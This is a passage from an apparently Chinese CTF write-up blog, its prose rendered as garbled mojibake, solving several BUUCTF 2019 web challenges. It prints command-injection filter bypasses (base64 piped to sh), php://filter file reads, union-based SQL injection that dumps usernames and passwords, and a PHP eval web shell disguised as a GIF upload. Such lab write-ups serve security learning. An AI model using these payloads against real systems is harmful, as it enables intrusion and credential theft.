class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytes<span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token string double-quoted-string">"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 4 "</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøáÊª§ÁöÑ‰∏çÂ∞ëÂïäÔºÅ<strong>‰º™ÂçèËÆÆÔºåËΩ¨‰πâÂ≠óÁ¨¶</strong>ÈÉΩ‰∏çËÉΩÁî®‰∫ÜÁî®Â≠óÁ¨¶ÊõøÊç¢ËØïËØïÂêß<br><code>http://03c1c197-5f25-4c94-b5a0-eb8e1d08e92f.node4.buuoj.cn:81/?ip=127.0.0.1;b=ag;cat$IFS$9fl$b.php</code><br>Êü•ÁúãÊ∫êÁ†ÅÂæóÂà∞flag<br><img src="https://img-blog.csdnimg.cn/6886b988df1241488482cddd05b97ae6.png" alt="6"><br><strong>ÊñπÊ≥ï‰∫å</strong><br>Â∫îËØ•ÂèØ‰ª•Â∞ÜÂëΩ‰ª§ËøõË°åbase64ÁºñÁ†ÅÔºåÂÜçÁî®base64-dÂëΩ‰ª§Êù•ÊâßË°åÔºåÂèØ‰ª•Áî®shÊù•ÊâßË°å<br><code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code> ÂæóÂà∞flag<br><strong>ÊñπÊ≥ï‰∏â</strong><br>Â∏àÂÇÖ‰ª¨ÊúâÁöÑÁî®ÂÜÖËÅîÊâßË°å</p><p>ÊâÄË∞ìÂÜÖËÅîÔºåÂ∞±ÊòØÂ∞ÜÂèçÂºïÂè∑ÂÜÖÂëΩ‰ª§ÁöÑËæìÂá∫‰Ωú‰∏∫ËæìÂÖ•ÊâßË°å</p><blockquote><p>?ip&#x3D;127.0.0.1;cat$IFS$9`ls`<br>$IFSÂú®Linux‰∏ãË°®Á§∫‰∏∫Á©∫Ê†º<br>$9ÊòØÂΩìÂâçÁ≥ªÁªüshellËøõÁ®ãÁ¨¨‰πù‰∏™ÂèÇÊï∞ÊåÅÊúâËÄÖÔºåÂßãÁªà‰∏∫Á©∫Â≠óÁ¨¶‰∏≤Ôºå$ÂêéÂèØ‰ª•Êé•‰ªªÊÑèÊï∞Â≠ó<br>Áî±‰∫élsÂæóÂá∫Êù•flag.phpÔºåindex.php„ÄÇËøôÊòØ‰ºöcatÂá∫flag.phpÂíåindex.php</p></blockquote><p><img src="https://img-blog.csdnimg.cn/d5db8ab9fb004a519fbbe440e4f633db.png" alt="7"><br>ÊàëËÆ§‰∏∫ËøôÁØáÊñáÁ´†‰∏çÈîôÔºåÂ§ßÂÆ∂ÂèØ‰ª•<a href="https://blog.csdn.net/vanarrow/article/details/108295481#:~:text=%E5%86%85%E8%81%94%EF%BC%8C%E5%B0%B1%E6%98%AF%E5%B0%86%E5%8F%8D%E5%BC%95%E5%8F%B7%E5%86%85%E5%91%BD%E4%BB%A4%E7%9A%84%E8%BE%93%E5%87%BA%E4%BD%9C%E4%B8%BA%E8%BE%93%E5%85%A5%E6%89%A7%E8%A1%8C%20%3Fip%3D127.0.0.1%3Bcat%24IFS%249%60ls%60%20%24IFS%E5%9C%A8Linux%E4%B8%8B%E8%A1%A8%E7%A4%BA%E4%B8%BA%E7%A9%BA%E6%A0%BC,%249%E6%98%AF%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9Fshell%E8%BF%9B%E7%A8%8B%E7%AC%AC%E4%B9%9D%E4%B8%AA%E5%8F%82%E6%95%B0%E6%8C%81%E6%9C%89%E8%80%85%EF%BC%8C%E5%A7%8B%E7%BB%88%E4%B8%BA%E7%A9%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%24%E5%90%8E%E5%8F%AF%E4%BB%A5%E6%8E%A5%E4%BB%BB%E6%84%8F%E6%95%B0%E5%AD%97%20%E8%BF%99%E9%87%8C%24IFS%249%E6%88%96%24IFS%E5%9E%82%E7%9B%B4%EF%BC%8C%E5%90%8E%E9%9D%A2%E5%8A%A0%E4%B8%AA%24%E4%B8%8E%7B%7D%E7%B1%BB%E4%BC%BC%EF%BC%8C%E8%B5%B7%E6%88%AA%E6%96%AD%E4%BD%9C%E7%94%A8%201">ÂèÇËÄÉ‰∏Ä‰∏ã</a></p><h2 id="ÊûÅÂÆ¢Â§ßÊåëÊàò-2019-Secret-File-1"><a href="#ÊûÅÂÆ¢Â§ßÊåëÊàò-2019-Secret-File-1" class="headerlink" title="[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Secret File 1"></a>[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Secret File 1</h2><p><img src="https://img-blog.csdnimg.cn/21b672b9a2514523b89df8ad798a406b.png" alt="1"><br>ÂéªÊ∫êÁ†ÅÁúãÁúã<br><img src="https://img-blog.csdnimg.cn/fb593331da744aa3930c6d89aeab2be7.png" alt="2"><br>Êúâ‰∏Ä‰∏™phpÊñá‰ª∂,ËÆøÈóÆ‰∏Ä‰∏ãÁúãÁúã<code>http://cd07cfe1-455f-47ff-bded-782f66105f3d.node4.buuoj.cn:81/Archive_room.php</code><br><img src="https://img-blog.csdnimg.cn/9d9847ef896e4a73a697ff0f032e8477.png" alt="2"><br>ÁÇπÂºÄÂêé<br><img src="https://img-blog.csdnimg.cn/f6d7e63800e843c5a194471e7b29604e.png" alt="3"><br>È°µÈù¢Ë∑≥ËΩ¨Â§™Âø´‰∫ÜÔºåÊäìÂåÖÁúãÁúã<br><img src="https://img-blog.csdnimg.cn/f09067820c274538b236cad427d872b6.png" alt="5"></p><p>Ê≥®ÈáäÂå∫Êúâ‰∏Ä‰∏™Êñá‰ª∂ËÆøÈóÆÁúãÁúã<br>ÂæóÂà∞Â¶Ç‰∏ã‰ª£Á†Å</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>secret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Oh no!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//flagÊîæÂú®‰∫Üflag.phpÈáå</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.w3school.com.cn/php/func_string_stristr.asp">PHP stristr() ÂáΩÊï∞</a><br><a href="https://www.w3school.com.cn/php/func_string_strstr.asp">PHP strstr() ÂáΩÊï∞</a><br>strstrÂíåstristrÈÉΩÊòØÂåπÈÖçÂ≠óÁ¨¶‰∏≤Áî®ÁöÑÔºå‰ΩÜÊòØstrstrÊòØÂå∫ÂàÜÂ§ßÂ∞èÂÜôÁöÑÔºåstristrÊòØ‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜôÁöÑ„ÄÇ</p><p>ÊâÄ‰ª•‰æãÂ¶ÇÔºö<br><code>&lt;?php  show_source(__FILE__);  echo $_GET[&#39;hello&#39;];  $page=$_GET[&#39;page&#39;];  while (strstr($page, &quot;php://&quot;)) &#123;  $page=str_replace(&quot;php://&quot;, &quot;&quot;, $page);   &#125;    include($page);    ?&gt;</code></p><blockquote><p>ËøôÊÆµphp‰ª£Á†ÅÔºåÂΩìpageÂèÇÊï∞‰∏≠Êúâphp:&#x2F;&#x2F;Â≠óÊÆµÁöÑÊó∂ÂÄôÂ∞±‰ºöË¢´ÊõøÊç¢ÊàêÁ©∫Ôºå‰ΩÜÊòØÊòØÁî®strstrÂåπÈÖçÁöÑÔºåÊâÄ‰ª•ÂÜôPHP:&#x2F;&#x2F;inputÂÜçpostÂ∞±‰∏ç‰ºöË¢´ÊõøÊç¢Êéâ„ÄÇ</p></blockquote><p>ÈÇ£‰πàÂ∞±ÈááÁî®php:&#x2F;&#x2F;ÂçèËÆÆ‰∏≠ÁöÑphp:&#x2F;&#x2F;filter<br><code>http://cd07cfe1-455f-47ff-bded-782f66105f3d.node4.buuoj.cn:81/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</code><br>ÂæóÂà∞</p><blockquote><p>PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZTNlZDgxOGYtZjM4MS00OWFjLThjNDEtOTMzOTE2ZmVjZGJjfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo&#x3D;<br>Ëß£ÂØÜ‰πãÂêéÂæóÂà∞flag„ÄÇ</p></blockquote><h2 id="ÊûÅÂÆ¢Â§ßÊåëÊàò-2019-LoveSQL"><a href="#ÊûÅÂÆ¢Â§ßÊåëÊàò-2019-LoveSQL" class="headerlink" title="[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]LoveSQL"></a>[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]LoveSQL</h2><p><img src="https://img-blog.csdnimg.cn/ac670dfd41f2450a8d5ca02b5e9d3dc9.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/404c661805b048e39d33a2094a1ca0c7.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/8bd81110c54a4d93b1977ffb225654d3.png" alt="3">Áõ¥Êé•‰∏áËÉΩÂØÜÁ†Å<br><img src="https://img-blog.csdnimg.cn/d90fecebb74646dcbf7f0067f51afab6.png" alt="4"><br><img src="https://img-blog.csdnimg.cn/f766ec5a93624dcaa587c5b8b7572887.png" alt="5"><br>ÂØÜÁ†Åmd5Ëß£ÂØÜ‰∏çËß£ÂØÜÈÉΩ‰∏çËÉΩÁî®ÔºåÈ¢òÁõÆÊó¢ÁÑ∂ÊòØLoveSQLÔºåÈÇ£Â∞±ÂºÄÂßãÊúÄÂü∫Á°ÄÁöÑÊìç‰Ωú<br>Êü•ÁúãÊúâÂá†Âàó<code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=admin&#39;  order by 4%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/aa0456adb9c04bb49d67511f09994f1d.png" alt="5"><br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=admin&#39;  order by 3%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/8a28e495e33e4fe3957bbdb7906bcf14.png" alt="6"><br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-admin&#39;  union select 1,2,3%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/760edddc69cb4cb2b42c44d75e69b35b.png" alt="7"><br>Âú®2Âíå3‰ΩçÁΩÆÊ≥®ÂÖ•<br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-admin&#39;  union select 1,database(),3%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/153c23c6528f42e3a70789972ce64e9a.png" alt="8"><br><strong>ÁàÜÁ†¥Ë°®ÂêçÔºö</strong><br> <code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/70b3fb676e0b4563b3f2bd70506e1390.png" alt="9"><br><strong>geekuser</strong>Âíå<strong>l0ve1ysq1</strong>ÔºåÂÖàÁúãÁ¨¨‰∏Ä‰∏™Ôºå<br><strong>ÁàÜÁ†¥ÂàóÂêçÔºö</strong><br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;geekuser&#39;%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/c4f226dea1934756b7a81508108a96f4.png" alt="10"><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(id,username,password) FROM geekuser%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/3cb3400a84e147568c891de1ffeddd5a.png" alt="11">‰∏çÂØπÔºåÁúãÂè¶‰∏Ä‰∏™Ë°®<br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(id,username,password) FROM l0ve1ysq1%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/953a9aa4e16446e8b2013e713a20350b.png" alt="12"></p><p>ÂæóÂà∞flag„ÄÇ</p><h2 id="ÊûÅÂÆ¢Â§ßÊåëÊàò-2019-Http"><a href="#ÊûÅÂÆ¢Â§ßÊåëÊàò-2019-Http" class="headerlink" title="[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Http"></a>[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Http</h2><p>Â∞±ÊòØ‰∏Ä‰∏™È°µÈù¢ÔºåÁúã‰∫Ü‰∏ÄÈÅçÊ≤°Âï•ÔºåÁúãÁúãÊ∫êÁ†ÅÔºö</p><p><img src="https://img-blog.csdnimg.cn/b4f8a8a9ad7b479b87433f35e4a099d5.png" alt="1"><br>Êúâsecret.phpÊñá‰ª∂<br><img src="https://img-blog.csdnimg.cn/950d2fd795e44872959f455c67bea634.png" alt="2">ÈúÄË¶Å‰º™ÈÄ†ÔºåÂºÄÂßãÊäìÂåÖÊîπÂåÖ</p><p><img src="https://img-blog.csdnimg.cn/413437df593244f88a61ca81d55ac52b.png" alt="4"><img src="https://img-blog.csdnimg.cn/2539fa128ac14f49813b00779ced60f1.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞"></p><p>ÁªßÁª≠Êîπ<br><img src="https://img-blog.csdnimg.cn/ca8fb6a9b04a44889273265f2145ace4.png" alt="5"><br>Êú¨Âú∞‰ª£ÁêÜÂºÄÂêØ<br><img src="https://img-blog.csdnimg.cn/a430853e4d5f49b080bf1273ade3b6c4.png" alt="5"></p><h2 id="ÊûÅÂÆ¢Â§ßÊåëÊàò-2019-Upload"><a href="#ÊûÅÂÆ¢Â§ßÊåëÊàò-2019-Upload" class="headerlink" title="[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Upload"></a>[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Upload</h2><p><strong>Êñá‰ª∂‰∏ä‰º†</strong><br><img src="https://img-blog.csdnimg.cn/bcaa47b202f84691a8025030c81de3e1.png" alt="1"><br>‰∏ÄÂè•ËØùÊú®È©¨ÂÆâÊéí‰∏äÔºÅ<code>&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[111])&lt;/script&gt;</code>Êàñ<code>&lt;?php eval$_POST[111];?&gt;</code>Êú¨È¢ò‰∏≠Á¨¨‰∫å‰∏™‰∏çË°åÔºåÈÄâÁ¨¨‰∏Ä‰∏™„ÄÇ‰ªñËÆ©‰∏ä‰º†‰∏ÄÂº†ÂõæÁâáÔºåÈÇ£Êàë‰ª¨Â∞±Âú®ÊäìÂåÖÁöÑÊó∂ÂÄôÊîπ‰∏Ä‰∏ã„ÄÇ</p><p><img src="https://img-blog.csdnimg.cn/943f2c97506b44f2a89f2411ca82ea8b.png" alt="3"><br>ÁªìÊûúÊ≤°ÊàêÂäü<br><img src="https://img-blog.csdnimg.cn/1d35bc7aa0804e2c8d483798fe1681c5.png" alt="2"><br>Âú®‰∏ÄÂè•ËØùÊú®È©¨ÂÜÖÂÆπÂâçÈù¢Âä†ÂÖ•<strong>gif89a</strong>ÔºåÂ¶ÇÔºögif89a &lt;%eval request(‚Äúxx‚Äù)%&gt; ÁÑ∂ÂêéÂ∞ÜÊú®È©¨‰øùÂ≠ò‰∏∫ÂõæÁâáÁöÑÊ†ºÂºèÔºåÂ¶Çxxx.jpgÔºåxx.gifÊñá‰ª∂Â§¥Ê¨∫È™óÂèØ‰ª•Áî®Êù•ÁªïËøáÁÆÄÂçïÁöÑwaf„ÄÇ</p><p><strong>‰ªÄ‰πàÊòØGIF89a?</strong></p><blockquote><p>‰∏Ä‰∏™GIF89aÂõæÂΩ¢Êñá‰ª∂Â∞±ÊòØ‰∏Ä‰∏™Ê†πÊçÆÂõæÂΩ¢‰∫§Êç¢Ê†ºÂºèÔºàGIFÔºâ89aÁâàÔºà1989Âπ¥7 ÊúàÂèëË°åÔºâËøõË°åÊ†ºÂºèÂåñ‰πãÂêéÁöÑÂõæÂΩ¢„ÄÇÂú®GIF89a‰πãÂâçËøòÊúâ87aÁâàÔºà1987Âπ¥5ÊúàÂèëË°åÔºâÔºå‰ΩÜÂú®Web‰∏äÊâÄËßÅÂà∞ÁöÑÂ§ßÂ§öÊï∞ÂõæÂΩ¢ÈÉΩÊòØ‰ª•89aÁâàÁöÑÊ†ºÂºèÂàõÂª∫ÁöÑ„ÄÇ 89aÁâàÁöÑ‰∏Ä‰∏™ÊúÄ‰∏ªË¶ÅÁöÑ‰ºòÂäøÂ∞±ÊòØÂèØ‰ª•ÂàõÂª∫Âä®ÊÄÅÂõæÂÉèÔºå‰æãÂ¶ÇÂàõÂª∫‰∏Ä‰∏™ÊóãËΩ¨ÁöÑÂõæÊ†á„ÄÅÁî®‰∏ÄÂè™ÊâãÊå•Âä®ÁöÑÊóóÂ∏úÊàñÊòØÂèòÂ§ßÁöÑÂ≠óÊØç„ÄÇÁâπÂà´ÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØÔºå‰∏Ä‰∏™Âä®ÊÄÅGIFÊòØ‰∏Ä‰∏™ ‰ª•GIF89aÊ†ºÂºèÂ≠òÂÇ®ÁöÑÊñá‰ª∂ÔºåÂú®‰∏Ä‰∏™ËøôÊ†∑ÁöÑÊñá‰ª∂ÈáåÂåÖÂê´ÁöÑÊòØ‰∏ÄÁªÑ‰ª•ÊåáÂÆöÈ°∫Â∫èÂëàÁé∞ÁöÑÂõæÁâá„ÄÇ</p></blockquote><p><img src="https://img-blog.csdnimg.cn/77420aae89a84bcf8f5f4b088d5a2939.png" alt="5"><br>ËøòÊòØ‰∏çË°å<br>ÂêéÊù•ÂèëÁé∞ÊòØÂÜôÊàêshell.phtmlÂèØ‰ª•Ôºå<img src="https://img-blog.csdnimg.cn/eae751b2d53548b4a0a8e06cd5532007.png" alt="6"><br>ËöÅÂâëËøûÊé•ÂæóÂà∞flag<br><img src="https://img-blog.csdnimg.cn/f2813def245f434e82b4e1bf716bab2a.png" alt="7"></p><h2 id="ÊûÅÂÆ¢Â§ßÊåëÊàò-2019-BabySQL"><a href="#ÊûÅÂÆ¢Â§ßÊåëÊàò-2019-BabySQL" class="headerlink" title="[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]BabySQL"></a>[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]BabySQL</h2><p><img src="https://img-blog.csdnimg.cn/7c30418f57b942f6b50b6cd9438386cd.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/d1cfa48ceafa4f56b8d51e4c4c218199.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/97419c713baf4031b1bee85bcb3d2c48.png" alt="3"><br>ÂèØËÉΩÊòØorË¢´ËøáÊª§‰∫ÜÔºåÈÇ£Â∞±ÂèåÂÜôÁªïËøá<br><img src="https://img-blog.csdnimg.cn/d6d8052077c14610b0e4be63ff5b83f7.png" alt="4"><br>ÊàêÂäüÔºÅ<br><img src="https://img-blog.csdnimg.cn/16958e2ab1af45e1ac30c433bef723af.png" alt="5"><br>ÁªèËøáÊµãËØïÔºåor,by,union,select,where,from,andÈÉΩË¢´ËøáÊª§‰∫ÜÔºåÈÇ£Â∞±ÈÉΩËøõË°åÂèåÂÜôÁªïËøá<br>ÁàÜÂá∫ÊúâÂì™‰∫õ‰ΩçÁΩÆÂèØ‰ª•ËøõË°åËæìÂá∫Êï∞ÊçÆ<br><code>1&#39; oorrder by 3#</code><br><em>ÁªèÊµãËØïÊúâ3Âàó</em></p><p>Êü•ÁúãÊï∞ÊçÆÂ∫ìÂêçÂ≠ó<br><code>1&#39; uunionnion selselectect 1,2,database()#</code></p><p>ÁàÜÁ†¥Ë°®ÂêçÔºö<br><code>-1&#39; uunionnion seselectlect 1,2,group_concat(table_name) FFROMROM infoorrmation_schema.tables wherwheree table_schema=database()#</code><br><img src="https://img-blog.csdnimg.cn/d4a24a5c9e66422eaee2a7d97cc3e5ab.png" alt="6"></p><p>ÁàÜÁ†¥ÂàóÂêçÔºö<br><code>1&#39; ununionion seselectlect 1,2,group_concat(column_name) FRFROMOM infoorrmation_schema.columns whewherere table_schema=database() and table_name=&#39;Ë°®Âêç&#39;#</code><br><img src="https://img-blog.csdnimg.cn/489436bf5b2c4bed8b6d663e4c2fc9b3.png" alt="7"></p><p>ÁàÜÁ†¥Êï∞ÊçÆÔºö<br><code>1&#39; uniunionon seleselectct 1,2,group_concat(id,username,passwoorrd) FFROMROM Ë°®Âêç#</code><br>ÂæóÂà∞flag.<br><img src="https://img-blog.csdnimg.cn/0d1f40d27af84b55a5307d37c9174e27.png" alt="8"></p><h3 id="ÊÄªÁªì‰∏Ä‰∏ã"><a href="#ÊÄªÁªì‰∏Ä‰∏ã" class="headerlink" title="ÊÄªÁªì‰∏Ä‰∏ã"></a>ÊÄªÁªì‰∏Ä‰∏ã</h3><p>Êú¨È¢òÈöæÂ∫¶‰∏çÂ§ßÔºå‰∏ªË¶ÅËøõË°åÂèåÂÜôÁªïËøáÔºåÂÖ∂‰∏≠orÂú®Ë¢´ËøáÊª§Êó∂Ë¶ÅÊ≥®ÊÑè<strong>information</strong>‰∏≠ÁöÑ<strong>or</strong>‰πü‰ºöËøáÊª§ÔºåÊâÄ‰ª•Ë¶ÅÂÜôÊàê<strong>infoorrmation</strong></p><h2 id="ÊûÅÂÆ¢Â§ßÊåëÊàò-2019-PHP"><a href="#ÊûÅÂÆ¢Â§ßÊåëÊàò-2019-PHP" class="headerlink" title="[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]PHP"></a>[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]PHP</h2><p>‰ªéÈ¢òÁõÆ‰∏äÊù•ÁúãËøôÊòØ‰∏ÄÈÅìphpÁöÑÈ¢òÁõÆÔºåÈ¶ñÈ°µÊòæÁ§∫Â≠òÂú®Â§á‰ªΩÁΩëÁ´ôÁöÑ‰π†ÊÉØ<br><img src="https://img-blog.csdnimg.cn/f4e9a9f0e8dc42e8bbc1e56acfa88747.png" 